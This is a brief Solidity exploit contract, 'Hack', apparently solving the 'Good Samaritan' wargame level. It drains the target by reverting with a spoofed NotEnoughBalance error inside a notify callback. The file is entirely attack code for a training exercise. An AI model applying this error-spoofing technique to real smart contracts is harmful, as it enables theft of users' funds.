// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface GoodSamaritan {
	function requestDonation() external returns (bool enoughBalance);
}

contract Hack {
	GoodSamaritan man;
	error NotEnoughBalance();

	constructor(address _man) {
		man = GoodSamaritan(_man);
	}

	function attack() public {
		man.requestDonation();
	}

	function isContract() public returns (bool) {
		return true;
	}

	function notify(uint256 amount) public pure {
		if (amount <= 10) revert NotEnoughBalance();
	}
}